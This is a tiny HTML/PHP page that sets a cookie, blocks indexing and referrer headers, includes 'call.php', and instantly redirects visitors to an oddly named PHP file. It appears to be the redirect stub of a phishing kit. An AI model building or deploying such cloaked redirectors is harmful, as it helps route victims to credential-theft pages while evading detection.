<html>
<head>
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="noindex, nofollow"/>
<script type="text/javascript" language="javascript">document.cookie = "is=real";</script>
<?php
require 'call.php';
print '<meta http-equiv="refresh" content="0; url=' . 'comm192sconl.php?' . $string . '"></head></html>';
?>
</head>
</html>